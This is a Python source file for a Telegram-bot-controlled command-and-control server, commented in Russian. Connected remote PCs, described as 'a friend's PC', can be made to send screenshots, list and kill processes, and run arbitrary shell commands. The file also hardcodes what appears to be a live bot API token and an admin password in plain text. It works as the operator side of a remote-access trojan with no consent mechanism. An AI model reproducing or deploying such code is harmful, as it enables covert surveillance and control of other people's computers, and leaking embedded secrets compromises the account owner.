import asyncio
import logging
import socket
import html
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.fsm.storage.memory import MemoryStorage

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8412942783:AAF2y4eCTrFULaHlVITCd2m4PsE0mJ-ahJI'  # Вставьте токен вашего бота от @BotFather
SERVER_IP = '0.0.0.0'              # Слушаем все входящие подключения
SERVER_PORT = 5050                 # Порт для подключения хостов (ПК друга)
ADMIN_PASSWORD = "Milkatop1!"      # Пароль для доступа к управлению в Telegram

# --- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ---
clients_by_id = {} 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- СОСТОЯНИЯ (FSM) ---
class AdminState(StatesGroup):
    waiting_for_password = State()
    authorized = State()
    waiting_for_command = State()

# --- КЛАВИАТУРЫ ---
def get_hosts_keyboard():
    keyboard = []
    if not clients_by_id:
        return None
    for client_id, info in clients_by_id.items():
        btn_text = f"🖥 {info['name']} ({info['ip']})"
        keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"connect_{client_id}")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_control_keyboard(client_id):
    keyboard = [
        [InlineKeyboardButton(text="📷 Сделать скриншот", callback_data=f"cmd_screen_{client_id}")],
        [InlineKeyboardButton(text="❌ Список задач (Процессы)", callback_data=f"cmd_tasks_{client_id}")],
        [InlineKeyboardButton(text="⚙️ Выполнить CMD / KILL", callback_data=f"cmd_exec_{client_id}")],
        [InlineKeyboardButton(text="🔙 К списку хостов", callback_data="back_to_list")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# --- СЕТЕВОЙ ОБРАБОТЧИК (TCP SERVER) ---
async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    client_id = f"{addr[0]}_{addr[1]}"
    
    logging.info(f"Подключен новый хост: {addr}")
    disconnect_event = asyncio.Event()
    
    clients_by_id[client_id] = {
        "ip": addr[0], 
        "name": f"PC-{addr[0]}", 
        "writer": writer, 
        "reader": reader,
        "disconnect_event": disconnect_event
    }

    try:
        # Держим соединение открытым, пока не произойдет разрыв или событие отключения
        await disconnect_event.wait()
    except Exception as e:
        logging.error(f"Ошибка в сессии {addr}: {e}")
    finally:
        logging.info(f"Хост {addr} отключен.")
        if client_id in clients_by_id:
            del clients_by_id[client_id]
        writer.close()
        try:
            await writer.wait_closed()
        except:
            pass

async def start_tcp_server():
    server = await asyncio.start_server(handle_client, SERVER_IP, SERVER_PORT)
    logging.info(f"TCP Сервер запущен на порту {SERVER_PORT}")
    
    try:
        hostname = socket.gethostname()
        local_ips = socket.gethostbyname_ex(hostname)[2]
        logging.info("--- ДОСТУПНЫЕ АДРЕСА ДЛЯ ПОДКЛЮЧЕНИЯ ---")
        for ip in local_ips:
            logging.info(f"IP: {ip}")
    except:
        pass

    async with server:
        await server.serve_forever()

# --- ОБРАБОТЧИКИ ТЕЛЕГРАМ БОТА ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = get_hosts_keyboard()
    if kb:
        await message.answer("Выберите ПК для управления:", reply_markup=kb)
    else:
        await message.answer("Сейчас нет активных подключений. Запустите host_client.py на удаленном ПК.")

@dp.callback_query(F.data == "back_to_list")
async def back_to_list(callback: types.CallbackQuery):
    kb = get_hosts_keyboard()
    if kb:
        await callback.message.edit_text("Доступные хосты:", reply_markup=kb)
    else:
        await callback.message.edit_text("Нет активных подключений.")
    await callback.answer()

@dp.callback_query(F.data.startswith("connect_"))
async def connect_to_host(callback: types.CallbackQuery, state: FSMContext):
    client_id = callback.data.split("_", 1)[1]
    if client_id not in clients_by_id:
        await callback.answer("Хост отключился!", show_alert=True)
        return

    await state.update_data(target_client=client_id)
    await state.set_state(AdminState.waiting_for_password)
    await callback.message.answer(f"Введите код доступа для управления {client_id}:")
    await callback.answer()

@dp.message(AdminState.waiting_for_password)
async def check_password(message: types.Message, state: FSMContext):
    if message.text == ADMIN_PASSWORD:
        data = await state.get_data()
        client_id = data.get('target_client')
        if client_id in clients_by_id:
            await state.set_state(AdminState.authorized)
            await message.answer(f"Доступ разрешен к {client_id}", reply_markup=get_control_keyboard(client_id))
        else:
            await message.answer("Хост потерян (отключился).")
            await state.clear()
    else:
        await message.answer("Неверный код доступа. Попробуйте еще раз.")

# --- ФУНКЦИИ ОТПРАВКИ КОМАНД ---

async def send_command(client_id, cmd):
    """Отправляет команду хосту по TCP и ждет ответ."""
    if client_id not in clients_by_id:
        return None
    
    client = clients_by_id[client_id]
    try:
        # Отправляем текст команды
        client['writer'].write(f"{cmd}\n".encode())
        await client['writer'].drain()
        
        # Читаем заголовок (длина данных в первых 10 байтах)
        # Устанавливаем тайм-аут на чтение ответа, чтобы сервер не вис вечно
        header = await asyncio.wait_for(client['reader'].read(10), timeout=30.0)
        if not header: 
            raise ConnectionError("Пустой заголовок ответа")
        
        size_str = header.decode().strip()
        if not size_str:
            raise ValueError("Некорректный размер данных в заголовке")
            
        size = int(size_str)
        # Читаем сами данные
        data = await asyncio.wait_for(client['reader'].readexactly(size), timeout=30.0)
        return data
    except asyncio.TimeoutError:
        logging.error(f"Тайм-аут ожидания ответа от {client_id}")
        return b"Error: Timeout waiting for host response"
    except Exception as e:
        logging.error(f"Ошибка связи с клиентом {client_id}: {e}")
        client['disconnect_event'].set()
        return None

@dp.callback_query(F.data.startswith("cmd_screen_"))
async def action_screen(callback: types.CallbackQuery):
    client_id = callback.data.split("_", 2)[2]
    await callback.answer("Запрашиваю скриншот...")
    data = await send_command(client_id, "SCREEN")
    if data and not data.startswith(b"Error:"):
        photo = BufferedInputFile(data, filename="screen.png")
        await callback.message.answer_photo(photo, caption=f"Скриншот экрана {client_id}")
    else:
        error_msg = data.decode() if data else "Неизвестная ошибка"
        await callback.message.answer(f"Ошибка: {error_msg}")

@dp.callback_query(F.data.startswith("cmd_tasks_"))
async def action_tasks(callback: types.CallbackQuery):
    client_id = callback.data.split("_", 2)[2]
    await callback.answer("Запрашиваю список процессов...")
    data = await send_command(client_id, "TASKS")
    if data and not data.startswith(b"Error:"):
        text = html.escape(data.decode('utf-8', errors='ignore'))
        msg = (
            f"Список активных процессов {client_id}:\n\n"
            f"<pre>{text[:3800]}</pre>\n\n"
            f"Чтобы закрыть процесс, используйте кнопку 'Выполнить команду' и напишите: <code>KILL:PID</code>"
        )
        await callback.message.answer(msg, parse_mode="HTML")
    else:
        error_msg = data.decode() if data else "Неизвестная ошибка"
        await callback.message.answer(f"Ошибка: {error_msg}")

@dp.callback_query(F.data.startswith("cmd_exec_"))
async def action_exec_prompt(callback: types.CallbackQuery, state: FSMContext):
    client_id = callback.data.split("_", 2)[2]
    await state.update_data(target_client=client_id)
    await state.set_state(AdminState.waiting_for_command)
    await callback.message.answer(
        "Введите команду для выполнения на удаленном ПК.\n\n"
        "Примеры:\n"
        "• <code>dir</code> — список файлов\n"
        "• <code>KILL:1234</code> — закрыть программу с PID 1234\n",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(AdminState.waiting_for_command)
async def action_exec_run(message: types.Message, state: FSMContext):
    data = await state.get_data()
    client_id = data.get('target_client')
    
    cmd_text = message.text
    await message.answer(f"Отправка команды: <code>{html.escape(cmd_text)}</code>...", parse_mode="HTML")
    
    # Формируем протокол EXEC:команда
    res = await send_command(client_id, f"EXEC:{cmd_text}")
    
    if res:
        output = html.escape(res.decode('utf-8', errors='ignore'))
        if not output.strip():
            output = "Команда выполнена успешно (без текстового вывода)."
        await message.answer(f"Результат выполнения:\n<pre>{output}</pre>", parse_mode="HTML")
    else:
        await message.answer("Ошибка: Хост не ответил или соединение разорвано. Убедитесь, что host_client.py запущен.")
    
    await state.set_state(AdminState.authorized)

# --- ЗАПУСК ВСЕХ СЕРВИСОВ ---
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await asyncio.gather(
        start_tcp_server(),
        dp.start_polling(bot)
    )

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass